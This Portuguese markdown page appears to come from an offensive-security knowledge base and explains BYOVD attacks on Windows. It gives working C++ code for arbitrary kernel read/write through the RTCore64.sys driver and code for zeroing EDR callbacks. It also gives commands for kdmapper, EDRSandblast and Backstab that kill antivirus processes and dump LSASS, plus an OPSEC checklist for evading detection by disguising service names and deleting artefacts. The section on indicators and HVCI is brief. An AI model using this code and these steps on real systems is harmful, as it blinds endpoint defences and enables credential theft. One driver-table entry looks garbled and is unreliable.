---
layout: cyber
section: evasao-kernel
title: "BYOVD: Bring Your Own Vulnerable Driver"
---

# BYOVD: Bring Your Own Vulnerable Driver

# O que é?

BYOVD (Bring Your Own Vulnerable Driver) é uma técnica de execução em kernel-mode que consiste no carregamento de um driver legítimo e assinado digitalmente, porém contendo vulnerabilidades de segurança conhecidas, para obter acesso privilegiado ao kernel do Windows sem violar as políticas de assinatura de código.

Desde o Windows Vista x64, o Windows impõe o DSE (Driver Signature Enforcement): drivers de kernel (arquivos `.sys`) precisam ser assinados com um certificado cross-certificado pela Microsoft ou aprovados via programa WHQL (Windows Hardware Quality Labs) para poderem ser carregados em modo kernel. Essa proteção tornou-se obrigatória por padrão no Windows 10 Anniversary Update (1607) para todos os sistemas x64, inclusive bloqueando o carregamento via boot de teste (Test Signing Mode) em ambientes de produção com Secure Boot ativo.

O mecanismo de DSE verifica a validade da assinatura digital do driver — mas não verifica se o conteúdo do driver contém vulnerabilidades de segurança. Um driver assinado pela MSI em 2018 com certificado WHQL completamente válido pode conter um bug de leitura/escrita arbitrária de memória kernel que nunca foi corrigido.

```
Modelo de privilégio x86-64:

  Ring 3 (User Mode)        Ring 0 (Kernel Mode)
  +-------------------+     +------------------------------+
  | Aplicações        |     | Windows Kernel (ntoskrnl.exe)|
  | Browsers, Office  |     | Drivers (.sys files)         |
  | Malware userland  |     | EDR Kernel Driver            |
  +-------------------+     +------------------------------+
           |                          |
           | syscall (NtXxx APIs)     | Acesso direto à RAM física,
           +------------------------->| registradores da CPU,
                                      | hardware DMA, MMIO
```

Uma vez que um driver vulnerável é carregado em Ring 0, qualquer processo userland com privilégio de administrador pode enviar IOCTLs para o device exposto pelo driver e explorar o bug de kernel R/W. Com leitura/escrita arbitrária de qualquer endereço de memória kernel, o atacante pode:

- Desativar callbacks de notificação do EDR (PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine, ObRegisterCallbacks) — tornando o EDR completamente cego para novos processos, DLLs e injeções
- Terminar processos protegidos por PPL (Protected Process Light) — incluindo antivírus e EDRs que rodam com proteção WinTcb-Light
- Patchear EtwThreatIntProvRegHandle para desativar o provider ETW-TI (Event Tracing for Windows Threat Intelligence) — cegando a telemetria de kernel usada por todos os EDRs modernos
- Manipular a estrutura EPROCESS de lsaiso.exe para remover proteção PPL e permitir dump de credenciais com Credential Guard ativo
- Mapear drivers customizados diretamente na memória do kernel sem registro em PsLoadedModuleList (técnica de ghost driver / kdmapper)

O catálogo LOLDrivers.io (Living Off The Land Drivers) documenta centenas de drivers de hardware legítimos com vulnerabilidades conhecidas, incluindo hashes SHA256, device names, códigos IOCTL e capacidades específicas de cada driver.

Grupos APT e ransomware que adotaram BYOVD como técnica padrão:
- RobbinHood ransomware (GDRV.sys do Gigabyte — usado para desativar proteção de processo do AV antes de criptografar arquivos)
- BlackByte ransomware (RTCore64.sys do MSI Afterburner)
- Lazarus Group (dbutil_2_3.sys da Dell — CVE-2021-21551)
- BlackMatter e AvosLocker (múltiplos drivers)

A técnica saiu do domínio da pesquisa de segurança em torno de 2019 e tornou-se operacionalmente rotineira em ataques avançados a partir de 2021.

---

# Onde é implementado?

Drivers vulneráveis explorados via BYOVD são provenientes de produtos comerciais completamente legítimos, amplamente distribuídos e instalados em milhões de máquinas ao redor do mundo:

**Ferramentas de overclock e monitoramento de hardware:**
- RTCore64.sys — MSI Afterburner (software de overclock e monitoramento de GPU da MSI). Um dos drivers mais usados em ataques BYOVD. Presente em notebooks gamer, sistemas de desktop de alto desempenho, LAN houses, ambientes de desenvolvimento de jogos.
- gdrv.sys — Driver de utilitários da Gigabyte (Gigabyte App Center, @BIOS, EasyTune). Presente em motherboards Gigabyte vendidas globalmente. Usado pelo RobbinHood.
- WinRing0x64.sys — OpenHardwareMonitor, HWiNFO64, CPUID HWMonitor. Amplamente distribuído como parte de ferramentas de diagnóstico open source e software de gerenciamento de temperatura.
- cpuz141_x64.sys — CPUID CPU-Z. Presente em praticamente qualquer empresa que faz benchmarking ou gestão de hardware.

**Drivers de fabricantes de hardware (OEM):**
- dbutil_2_3.sys — Dell DBUtil (driver de atualização de firmware da Dell). Presente em notebooks e desktops Dell corporativos em todo o mundo. CVE-2021-21551. Afeta praticamente toda a linha Dell de laptops e desktops de 2009 a 2021.
- HwOs2Ec10x64.sys — ASUS. Presente em produtos da linha Republic of Gamers e notebooks ASUS.
- AsrDrv106.sys — ASRock. Motherboards ASRock (linha budget corporativa).
- ATSZIO64.sys — ASRock.

**Produtos de segurança e diagnóstico (ironicamente):**
- Drivers de antivírus e produtos de segurança frequentemente rodam em kernel mode com amplos privilégios — e historicamente tiveram suas próprias vulnerabilidades de kernel R/W. A ironia é completa: o próprio driver do AV pode ser o vetor de BYOVD.
- procexp152.sys — Sysinternals Process Explorer (Microsoft). Distribuído pela própria Microsoft como ferramenta de diagnóstico. Permite terminar qualquer processo incluindo PPL — usado pelo Backstab para matar processos de AV/EDR.

**Ambientes corporativos onde BYOVD é relevante:**

```
Cenários de deployment típicos:

  Enterprise com frota Dell:
  +---------------------------+
  | 5.000 laptops Dell        |
  | dbutil_2_3.sys instalado  |  <-- vulnerável em todos
  | BIOS Utility presente     |
  +---------------------------+

  Gaming/Creative Studio:
  +---------------------------+
  | Workstations com GPU      |
  | MSI Afterburner instalado |  <-- RTCore64.sys presente
  | Overclock habilitado      |
  +---------------------------+

  IT / Helpdesk com Sysinternals:
  +---------------------------+
  | Process Explorer deployado|
  | procexp152.sys carregado  |  <-- termina processos PPL
  | em ferramentas de suporte |
  +---------------------------+
```

Ambientes de alta segurança que se tornam alvos diretos quando BYOVD está disponível:
- Organizações governamentais e defesa (onde EDR e PPL são mandatórios)
- Instituições financeiras (onde proteção de processo é padrão para endpoints)
- Operadoras de saúde (onde endpoints têm Credential Guard ativo)
- Provedores de infraestrutura crítica

---

# Como funciona de forma adequada?

Para entender por que BYOVD funciona, é necessário compreender a arquitetura normal de drivers Windows — como drivers legítimos funcionam, por que precisam de acesso kernel direto e como a comunicação entre userland e o driver acontece via IRP (I/O Request Packet).

**Modelo de driver Windows — funcionamento legítimo:**

```
  User Mode (Ring 3)                Kernel Mode (Ring 0)
  +------------------+              +-------------------------+
  | Aplicação de     |              | ntoskrnl.exe            |
  | overclock (MSI   |              | (Windows Kernel)        |
  | Afterburner)     |              |                         |
  |                  |  CreateFile  | I/O Manager             |
  | CreateFile(      +----------->  | (cria File Object,      |
  | "\\.\RTCore64")  |              |  entrega ao driver)     |
  |                  |              |          |              |
  | DeviceIoControl( |  IRP_MJ_     |          v              |
  | IOCTL_READ_TEMP  +----------->  | RTCore64.sys Driver     |
  | )                |   DEVICE_IO  | (DriverObject,          |
  |                  |  _CONTROL    |  DeviceObject)          |
  |                  |              |          |              |
  | Recebe: 73°C     | <-----------+           | RDMSR, WRMSR|
  |                  |  IRP         |           | (lê temp    |
  +------------------+  completado  |           | do sensor   |
                                    |           | de hardware)|
                                    +-----------+-------------+
```

**Como Device Objects e Symbolic Links funcionam:**

Quando o driver é carregado, ele chama `IoCreateDevice()` para criar um Device Object e `IoCreateSymbolicLink()` para expor um nome acessível a userland:

```
Kernel:  \Device\RTCore64       (Device Object real — invisível a userland)
          |
          | IoCreateSymbolicLink
          v
Userland: \DosDevices\RTCore64  → acessível como \\.\RTCore64
```

Uma aplicação userland abre o device com `CreateFile("\\.\RTCore64", ...)` e depois envia comandos via `DeviceIoControl()` com um código IOCTL específico.

**Como IOCTLs funcionam — fluxo de IRP:**

```
  Userland                       Kernel
  +----------+                   +----------------------------------+
  | DeviceIO |  envia IRP        | I/O Manager                      |
  | Control  +-----------------> | IRP_MJ_DEVICE_CONTROL            |
  | (IOCTL,  |                   | IoGetCurrentIrpStackLocation()   |
  | buffer)  |                   | stack->Parameters.               |
  |          |                   | DeviceIoControl.IoControlCode    |
  |          |                   |          |                        |
  |          |                   |          v                        |
  |          |                   | Driver DispatchDeviceControl()   |
  |          |                   | switch (IoControlCode):          |
  |          |                   |   case IOCTL_READ_MEMORY:        |
  |          |                   |     addr = buffer->Address       |
  |          |                   |     value = *addr  ← BUG: sem   |
  |          |                   |     validação de endereço!       |
  |          |                   |          |                        |
  |          |   IRP completado  |          v                        |
  |          | <-----------------+ IoCompleteRequest(Irp, ...)      |
  | recebe   |                   +----------------------------------+
  | value    |
  +----------+
```

**Por que drivers de hardware precisam de acesso kernel direto:**

Drivers de overclock e monitoramento precisam interagir com hardware de forma que não é possível em userland:

```
  Operações que requerem Ring 0:

  RDMSR / WRMSR     → leitura/escrita de Model Specific Registers
                       (frequência de CPU, voltage, contadores de perf)

  IN / OUT          → leitura/escrita de portas de I/O
                       (controladores PCI, chips Super I/O)

  Acesso físico     → mapeamento de endereços físicos via MmMapIoSpace
  a memória         (MMIO de GPU, BIOS flash, ACPI tables)

  IOMMU / DMA       → configuração de transferências DMA diretas
                       para GPU, NVMe, controladores de rede
```

Essas operações exigem Ring 0 por design — não é possível fazer `RDMSR` de userland. Por isso drivers de hardware precisam rodar em kernel mode. O bug de segurança está na ausência de validação dos endereços fornecidos pelo usuário antes de usá-los em operações de memória kernel.

**Como DSE (Driver Signature Enforcement) protege — e por que BYOVD o contorna:**

```
  Processo de carregamento de driver com DSE ativo:

  sc.exe start MeuDriver
        |
        v
  Windows Service Control Manager
        |
        v
  Kernel: IopLoadDriver()
        |
        v
  ci.dll (Code Integrity) — verifica:
    [✓] Arquivo .sys tem assinatura digital?
    [✓] Certificado é de CA confiável (Microsoft cross-cert ou WHQL)?
    [✓] Hash do arquivo bate com a assinatura?
    [ ] O driver tem vulnerabilidades conhecidas? ← NÃO VERIFICADO
        |
        v (todas as verificações passam)
  Driver carregado em kernel memory (Ring 0)
```

A Microsoft implementou uma blocklist de drivers vulneráveis conhecidos (HVCI Blocklist / WDAC Recommended Driver Block Rules), mas ela requer HVCI (Hypervisor Protected Code Integrity) ativo para ser imposta automaticamente. Em sistemas sem HVCI, a blocklist não é verificada durante o carregamento normal.

**Ciclo de vida completo de um ataque BYOVD:**

```
  Atacante (Admin local)            Sistema Windows

  1. Dropar driver em disco
     C:\Windows\Temp\vuln.sys -----> [arquivo no disco]

  2. Criar serviço de kernel         Service Control Manager
     sc create VulnDrv               registra entrada em
     type= kernel                    HKLM\SYSTEM\CurrentControlSet
     binPath= C:\...\vuln.sys  ----> \Services\VulnDrv

  3. Iniciar serviço                 Kernel carrega driver
     sc start VulnDrv ------------>  ci.dll verifica assinatura
                                     → assinada → carregado
                                     \Device\VulnDev criado

  4. Abrir handle para device
     CreateFile("\\.\VulnDev") ---->  I/O Manager retorna handle

  5. Enviar IOCTL de leitura
     DeviceIoControl(IOCTL_READ,      Driver lê qualquer
     &kernel_address) ------------->  endereço kernel sem
                                      validação → retorna valor

  6. Enviar IOCTL de escrita
     DeviceIoControl(IOCTL_WRITE,     Driver escreve em
     &callback_addr, 0) ----------->  PspCreateProcessNotifyRoutine
                                      → callback do EDR zerado

  7. Limpeza                          EDR está cego
     sc stop; sc delete VulnDrv
     del C:\...\vuln.sys
```

**Internos do kernel — o que acontece quando um callback é zerado:**

```
  ntoskrnl.exe — PspCreateProcessNotifyRoutine (array de 64 entradas)

  Antes do ataque:
  Index 0: 0xFFFFF80012345001  → WdFilter.sys (Windows Defender)
  Index 1: 0xFFFFF80023456001  → CrowdStrike.sys (EDR)
  Index 2: 0xFFFFF80034567001  → SentinelOne.sys (EDR)
  ...
  PspCreateProcessNotifyRoutineCount = 3

  Após WriteMemory via driver vulnerável:
  Index 0: 0xFFFFF80012345001  → WdFilter.sys
  Index 1: 0x0000000000000000  ← zerado (CrowdStrike cego)
  Index 2: 0xFFFFF80034567001  → SentinelOne.sys
  ...
  PspCreateProcessNotifyRoutineCount = 2

  Resultado: CrowdStrike não recebe notificação de novos processos,
  carregamento de DLLs e criação de threads — efetivamente cego.
```

---

## Ring 0, DSE e Kernel R/W Arbitrário

### Conceitos Fundamentais

**Ring 0 vs Ring 3:**
O processador Intel/AMD tem quatro níveis de privilégio (rings 0-3). O código de aplicação roda em Ring 3 (userland). O kernel do Windows e drivers rodam em Ring 0 (kernel mode). Em Ring 0, não existem restrições de acesso a memória — qualquer endereço físico pode ser lido ou escrito.

**Por que drivers precisam ser assinados:**
Driver Signature Enforcement (DSE) é uma proteção que impede carregar drivers sem assinatura válida (ou com assinatura inválida). Implementada via `ci.dll` (Code Integrity). No modo Secure Boot + UEFI, o DSE é ainda mais rígido. Porém, drivers **com** assinatura válida são carregados sem verificação de conteúdo de segurança.

**O que é "kernel R/W arbitrário":**
Um driver vulnerável expõe um device (via `\Device\NomeDoDevice`) e IOCTLs (I/O Control Codes) que deveriam ser usados para funções legítimas (overclocking, acesso a hardware, etc.). O bug é que esses IOCTLs não validam adequadamente os endereços de memória fornecidos pelo usuário — permitindo que qualquer processo userland leia ou escreva em qualquer endereço de memória kernel.

**Fluxo genérico de ataque BYOVD:**
```
1. Obter o driver vulnerável (arquivo .sys)
2. Copiar o driver para disco (ex: C:\Windows\Temp\nome_legitimo.sys)
3. Registrar serviço: sc create VulnDrv type= kernel binPath= C:\...\driver.sys
4. Iniciar serviço: sc start VulnDrv
5. Abrir handle: CreateFile("\\\\.\\\DeviceName", GENERIC_READ|GENERIC_WRITE, ...)
6. Enviar IOCTL de leitura: DeviceIoControl(handle, IOCTL_READ, &addr, ...)
7. Enviar IOCTL de escrita: DeviceIoControl(handle, IOCTL_WRITE, &addr, &value, ...)
8. Usar R/W para objetivo (desativar EDR, terminar PPL, etc.)
9. Parar e deletar serviço: sc stop VulnDrv; sc delete VulnDrv
10. Deletar arquivo do driver
```

### Por Que os Drivers São Vulneráveis

A maioria dos drivers vulneráveis no catálogo LOLDrivers.io foi escrita para acessar hardware diretamente (hardware de overclocking, monitoramento de temperatura, flash de firmware de GPU/SSD). Para isso, precisam de acesso a memória física e registradores do processador — funções legítimas. O bug é não verificar se o endereço fornecido pelo processo do usuário é "seguro" antes de usá-lo:

```c
// Código vulnerável típico no driver:
NTSTATUS HandleIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
    
    if (code == IOCTL_READ_MEMORY) {
        // PROBLEMA: usa o endereço vindo do userland sem validação!
        PULONG addr = (PULONG)Irp->AssociatedIrp.SystemBuffer;
        ULONG value = *addr;  // Lê qualquer endereço kernel!
        // ...
    }
}
```

---

## Na Prática

### Caso de Estudo: RTCore64.sys (MSI Afterburner)

RTCore64.sys é o driver do MSI Afterburner (software de overclocking de GPU). Foi descoberto em 2019 pela Sophos e é o driver mais documentado e amplamente usado em ataques BYOVD — presente em ferramentas como EDRSandblast e Backstab.

**Informações técnicas:**
- Hash MD5: `b50d1db..` (vários builds, conferir LOLDrivers.io)
- Hash SHA256: `01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd`
- Device name: `\\.\RTCore64`
- Fabricante: Micro-Star International (MSI)
- Versão vulnerável: 1.0.0.5

**IOCTLs de interesse:**

| Código IOCTL | Operação | Input | Output |
|-------------|----------|-------|--------|
| `0x80002048` | Leitura de memória | Endereço (QWORD) | Valor lido (DWORD) |
| `0x8000204C` | Escrita de memória | Endereço (QWORD) + Valor (DWORD) | — |
| `0x80002058` | Leitura de memória física | Endereço físico | Valor |
| `0x80002054` | Escrita de memória física | Endereço físico + Valor | — |

**Estrutura do buffer de IOCTL (Read):**
```c
typedef struct _RTCORE64_MEMORY_READ {
    BYTE Padding[8];        // 8 bytes de padding
    DWORD64 Address;        // Endereço de memória a ler
    BYTE Padding2[4];       // 4 bytes de padding
    DWORD ReadSize;         // Tamanho: 1, 2 ou 4 bytes
    DWORD Value;            // Valor lido (output)
    BYTE Padding3[16];      // Padding final
} RTCORE64_MEMORY_READ;
```

**Estrutura do buffer de IOCTL (Write):**
```c
typedef struct _RTCORE64_MEMORY_WRITE {
    BYTE Padding[8];
    DWORD64 Address;        // Endereço de memória a escrever
    BYTE Padding2[4];
    DWORD WriteSize;        // Tamanho: 1, 2 ou 4 bytes
    DWORD Value;            // Valor a escrever
    BYTE Padding3[16];
} RTCORE64_MEMORY_WRITE;
```

**Código C++ para interagir com RTCore64.sys:**
```cpp
#include <windows.h>
#include <stdio.h>

#define IOCTL_READ  0x80002048
#define IOCTL_WRITE 0x8000204C

HANDLE OpenRTCore64() {
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\RTCore64",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Falha ao abrir RTCore64: %d\n", GetLastError());
    }
    return hDevice;
}

DWORD ReadMemory(HANDLE hDevice, DWORD64 address, DWORD size) {
    BYTE buffer[0x40] = {0};
    DWORD64* addrPtr = (DWORD64*)(buffer + 8);
    DWORD* sizePtr  = (DWORD*)(buffer + 20);
    DWORD* valuePtr = (DWORD*)(buffer + 24);
    
    *addrPtr = address;
    *sizePtr = size;
    
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_READ,
                    buffer, sizeof(buffer),
                    buffer, sizeof(buffer),
                    &bytesReturned, NULL);
    
    return *valuePtr;
}

void WriteMemory(HANDLE hDevice, DWORD64 address, DWORD value, DWORD size) {
    BYTE buffer[0x40] = {0};
    DWORD64* addrPtr  = (DWORD64*)(buffer + 8);
    DWORD* sizePtr    = (DWORD*)(buffer + 20);
    DWORD* valuePtr   = (DWORD*)(buffer + 24);
    
    *addrPtr  = address;
    *sizePtr  = size;
    *valuePtr = value;
    
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_WRITE,
                    buffer, sizeof(buffer),
                    buffer, sizeof(buffer),
                    &bytesReturned, NULL);
}
```

### Caso de Estudo: DBUtil_2_3.sys (Dell)

Driver de atualização de firmware da Dell. CVE-2021-21551. Inclui um bug de kernel R/W muito mais poderoso que RTCore64.

**Informações técnicas:**
- CVE: CVE-2021-21551
- Device: `\\.\DBUtil_2_3`
- IOCTLs: `0x9B0C1EC4` (read), `0x9B0C1EC8` (write)
- Permite leitura/escrita de 64 bits (QWORD), mais flexível

**Diferencial do DBUtil:** Permite operações de 64 bits (QWORD) diretamente, simplificando a manipulação de ponteiros em sistemas 64-bit. O RTCore64 requer operações de 32 bits (DWORD) com duas chamadas para endereços de 64 bits.

### Caso de Estudo: procexp152.sys (Process Explorer)

Driver assinado pela Microsoft, distribuído com Sysinternals Process Explorer. Permite terminar qualquer processo, incluindo PPL. Usado pelo Backstab.

- Device: `\\.\ProcExp152`
- IOCTL: `0x8335003C` (terminar processo por PID)
- Não requer SYSTEM se o processo usuário tem privilégio de admin

### Outros Drivers no Catálogo LOLDrivers.io

| Driver | Fabricante | CVE | Capacidade |
|--------|-----------|-----|-----------|
| `Nt marta.sys` | NVIDIA | — | Kernel R/W |
| `nvflash64.sys` | NVIDIA | — | Kernel R/W |
| `gdrv.sys` | Gigabyte | — | Kernel R/W |
| `ATSZIO64.sys` | ASRock | — | Kernel R/W |
| `WinRing0x64.sys` | OpenHardwareMonitor | — | Kernel R/W |
| `cpuz141_x64.sys` | CPUID CPU-Z | — | Physical R/W |
| `AsrDrv106.sys` | ASRock | — | Kernel R/W |
| `HwOs2Ec10x64.sys` | ASUS | — | Kernel R/W |

---

## Exemplos de Código / Comandos

### Carregar Driver Manualmente (PowerShell/CMD como Admin)

```powershell
# Copiar driver para local discreto
Copy-Item "RTCore64.sys" "C:\Windows\System32\drivers\RTCore64.sys"

# Criar serviço de kernel driver
sc.exe create RTCore64 type= kernel binPath= "C:\Windows\System32\drivers\RTCore64.sys"

# Iniciar driver
sc.exe start RTCore64

# Verificar se device está disponível
[System.IO.File]::Exists("\\.\RTCore64")  # Não funciona assim
# Usar:
$handle = [System.IO.FileStream]::new("\\.\RTCore64", 'Open', 'Read', 'None')
```

### kdmapper — Carregar Driver Sem Registro

kdmapper usa o driver Intel `iqvw64e.sys` para mapear um driver customizado diretamente na memória do kernel, sem usar o mecanismo de carregamento normal do Windows (sem sc.exe, sem entrada em PsLoadedModuleList, invisível para ferramentas de análise):

```cmd
# Uso básico
kdmapper.exe custom_driver.sys

# Flags disponíveis:
kdmapper.exe --help

# Com passagem de parâmetros para o driver
kdmapper.exe custom_driver.sys 0xDEADBEEF

# Verificar se Intel driver está disponível
sc.exe create iqvw64e type= kernel binPath= "C:\path\iqvw64e.sys" start= demand
sc.exe start iqvw64e
```

**Como kdmapper funciona internamente:**
1. Carrega `iqvw64e.sys` da Intel (assinado legitimamente)
2. Usa IOCTL `0x80862007` do driver Intel para mapear memória física
3. Aloca pool de kernel via o driver Intel
4. Copia manualmente as seções do driver customizado
5. Resolve imports manualmente (chama MmGetSystemRoutineAddress)
6. Chama DriverEntry do driver customizado
7. **Não registra em PsLoadedModuleList** — driver é invisível

### EDRSandblast — Automatizar Remoção de Callbacks

EDRSandblast é a ferramenta open-source mais completa para BYOVD. Automatiza a remoção de callbacks de EDR usando RTCore64.sys ou DBUtil_2_3.sys.

```cmd
# Syntax básica
EDRSandblast.exe --help

# Remover callbacks de EDR (requer driver vulnerável)
EDRSandblast.exe -a killAV --driver RTCore64.sys --device RTCore64

# Remover callbacks + ETW-TI
EDRSandblast.exe -a killAV --driver RTCore64.sys --device RTCore64 --unhook-ntdll

# Dump de LSASS após remover proteções
EDRSandblast.exe -a dumpLsass --driver RTCore64.sys --device RTCore64

# Usar DBUtil ao invés de RTCore64
EDRSandblast.exe -a killAV --driver DBUtil_2_3.sys --device DBUtil_2_3

# Opções úteis:
# --dump-lsass-path: especificar onde salvar dump
# --lsass-dump-mode: nanodump, procdump, ou api
# --dont-disable-ppl: não desativar PPL (apenas callbacks)
```

**O que EDRSandblast faz:**
1. Carrega driver vulnerável
2. Localiza `PspCreateProcessNotifyRoutine` em ntoskrnl.exe
3. Itera o array de callbacks
4. Para cada callback cujo módulo de origem é o EDR alvo: zera o ponteiro
5. Decrementa `PspCreateProcessNotifyRoutineCount`
6. Repete para `PspLoadImageNotifyRoutine` e `PspCreateThreadNotifyRoutine`
7. Opcionalmente: patch de ETW-TI para cegar telemetria

### Backstab — Terminar Processos PPL

```cmd
# Terminar processo protegido por PID
Backstab.exe -n MsMpEng.exe -k

# Suspender processo EDR
Backstab.exe -n MsMpEng.exe -s

# Listar processos PPL
Backstab.exe -l

# Terminar por PID
Backstab.exe -p 1234 -k

# Usar driver específico
Backstab.exe -n MsMpEng.exe -k --driver C:\path\ProcExp152.sys
```

### Encontrar Offsets Necessários

EDRSandblast e ferramentas similares precisam saber os offsets de estruturas do kernel para sua versão específica do Windows. Há duas abordagens:

**1. Banco de offsets pré-calculado (EDRSandblast usa isso):**
```
NTOSKRNL_NtBuildNumber: 26100 (Windows 11 24H2)
PspCreateProcessNotifyRoutine offset: 0xA2E1C0
PspLoadImageNotifyRoutine offset: 0xA2E240
PspCreateThreadNotifyRoutine offset: 0xA2E280
EtwThreatIntProvRegHandle offset: 0x...
```

**2. Cálculo em runtime via pattern scanning:**
```c
// Encontrar base do ntoskrnl
ULONG64 GetNtoskrnlBase() {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    // ntoskrnl é sempre o primeiro da lista
    return (ULONG64)drivers[0];
}

// Pattern scan para PspCreateProcessNotifyRoutine
// (busca por sequência de bytes que precede o array)
```

### Desativar Callbacks do EDR — Conceito Detalhado

```c
// PspCreateProcessNotifyRoutine é um array de 64 ponteiros
// Cada entrada tem a forma: ponteiro | flag_de_remocao
// Para remover callback do EDR:

// 1. Ler ponteiro do callback no índice i
DWORD64 entry = ReadMemoryQword(driver, 
    NtoskrnlBase + PspCreateProcessNotifyRoutineOffset + (i * 8));

// 2. O ponteiro real é entry & ~0xF (limpar flags dos últimos 4 bits)
DWORD64 callbackPtr = entry & ~0xF;

// 3. Ler o nome do módulo do callback para identificar o EDR
// (requer navegar estrutura EX_CALLBACK_ROUTINE_BLOCK)

// 4. Se for o EDR: zerar o ponteiro
WriteMemoryQword(driver, 
    NtoskrnlBase + PspCreateProcessNotifyRoutineOffset + (i * 8), 0);

// 5. Decrementar contador de callbacks
DWORD count = ReadMemoryDword(driver, 
    NtoskrnlBase + PspCreateProcessNotifyRoutineCountOffset);
WriteMemoryDword(driver, 
    NtoskrnlBase + PspCreateProcessNotifyRoutineCountOffset, count - 1);
```

---

## Detecção e OPSEC

### Vetores de Detecção

**1. Hash do driver:**
Soluções de segurança mantêm blocklists de hashes de drivers vulneráveis conhecidos. A Microsoft tem uma blocklist mantida via Windows Update. Para evadir:
- Use versão menos conhecida do driver vulnerável
- Verifique LOLDrivers.io para o hash específico e se está na blocklist da Microsoft

**2. Nome do device:**
O device name do driver (ex: `\\.\RTCore64`) é estático e pode ser monitorado. Ferramentas de EDR podem alertar ao abrir handle para devices conhecidos como vulneráveis.

**3. Driver em disco:**
A simples presença de RTCore64.sys ou DBUtil_2_3.sys em disco pode acionar AV/EDR. Para mitigar:
- Dropar driver em local incomum (não `C:\Windows\System32\drivers\`)
- Executar imediatamente e deletar após uso
- Usar kdmapper para evitar dropar para disco (só a DLL do Intel driver precisa estar no disco)

**4. sc.exe create/start:**
Criação de serviço de kernel é um evento monitorado (Event ID 7045 no System log). Para mitigar:
- Usar APIs diretas do Windows ao invés de sc.exe
- Registrar serviço com nome que se mistura ao sistema (ex: `WdFilter`, `MpKsl...`)

**5. Uso de IOCTL suspeito:**
Eventos de abertura de handle para devices não-padrão podem ser logados pelo Kernel ETW. O ETW-TI loga handles para `\Device\RTCore64`, etc.

**6. Microsoft HVCI (Hypervisor-Protected Code Integrity):**
Se HVCI estiver ativo, blocos de código do kernel que não foram assinados ou que foram modificados geram violações que crasham o sistema (BSOD). BYOVD ainda funciona, mas modificar callbacks diretamente pode acionar proteções. Em sistemas com HVCI, a técnica de zeroing de callbacks pode falhar — precisa de abordagem diferente (ex: modificar a função do callback via patch de code).

### OPSEC Checklist

```
[ ] Verificar se driver está na blocklist do Windows Defender
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config"
    
[ ] Verificar se HVCI está ativo
    (Get-ComputerInfo).DeviceGuardCodeIntegrityPolicyEnforcementStatus
    
[ ] Verificar logs de Sysmon (Event 6 = driver carregado)
    Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 6}
    
[ ] Usar nome de serviço que mistura com sistema
    sc create "WdBootDriver" type= kernel ...
    
[ ] Deletar driver de disco imediatamente após uso
    Remove-Item C:\...\driver.sys -Force
    
[ ] Parar e deletar serviço após conclusão
    sc stop ServiceName; sc delete ServiceName
    
[ ] Verificar se ETW está sendo coletado por SIEM antes de prosseguir
```

### Indicadores de Comprometimento

- Event ID 7045: "A new service was installed" com `type= kernel`
- Sysmon Event ID 6: "Driver loaded" com hash na blocklist
- Presença de drivers de fabricantes inesperados (MSI, Dell, Intel) em hosts sem esse hardware
- Processo não-privilegiado abrindo handle para device `\\.\RTCore64`, `\\.\DBUtil_2_3`, etc.
- Múltiplas leituras/escritas IOCTL em curto período

### Microsoft Driver Blocklist

A Microsoft mantém blocklist atualizada via Windows Defender e Windows Update:
- Habilitada automaticamente em HVCI (Memory Integrity)
- Disponível em: https://learn.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules
- LOLDrivers.io indica quais estão na blocklist

---

## HVCI — Hypervisor-Protected Code Integrity e Impacto em BYOVD

### Como HVCI Usa SLAT para W^X

HVCI (também chamado **Memory Integrity** no Windows Security) usa SLAT (Second Level Address Translation — Intel EPT ou AMD NPT) para enforcement de W^X a nível de hardware:

```
Sem HVCI:
  Kernel pode criar página com PTEs: Present + Writable + Executable
  Atacante via driver R/W: modifica PTE → página torna-se exec → shellcode roda

Com HVCI:
  Hypervisor intercepta toda modificação de page table em VTL 0
  Verifica: página tem Write? Então não pode ter Execute
  W^X enforçado via SLAT — nem o kernel pode criar página W+X
```

Fluxo de validação:
```
Driver tenta executar novo código (VirtualAlloc + VirtualProtect(exec))
       │
Hypervisor recebe VMEXIT para mudança de PTE
       │
Hypervisor verifica: código assinado (KMCI)? 
   ├─ Sim → permite
   └─ Não → BSOD ou bloqueio silencioso dependendo de modo
```

### Impacto Específico em BYOVD

| Cenário | Sem HVCI | Com HVCI |
|---------|----------|---------|
| Carregar driver assinado vulnerável | Funciona | Funciona (ainda é assinado) |
| Carregar driver não assinado via BYOVD | Funciona (DSE desabilitado via memória) | **Bloqueado** (DSE em VTL 1) |
| Explorar R/W para injetar shellcode no kernel | Funciona | **Bloqueado** (W^X via SLAT) |
| Desabilitar callbacks via BYOVD R/W | Funciona | Funciona (dados, não código) |
| Ghost driver (kdmapper) | Funciona | **Bloqueado** |

**Conclusão crítica**: HVCI não bloqueia todos os vetores de BYOVD. Drivers vulneráveis **assinados** ainda carregam com HVCI ativo. O que HVCI bloqueia é:
1. Manipulação de DSE via escrita direta em memória kernel
2. Alocação de shellcode kernel executável (W^X)
3. Carregamento de drivers não assinados via kdmapper-style mapping

Vetores que **ainda funcionam com HVCI**:
- BYOVD com driver assinado → explorar R/W → modificar **dados** (callbacks, PPL flags em EPROCESS)
- DKOM via R/W em estruturas de dados (não execução de novo código)

### Verificar HVCI

```powershell
# Via WMI DeviceGuard
Get-WmiObject -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard |
    Select VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus
# VirtualizationBasedSecurityStatus: 2 = HVCI ativo e rodando
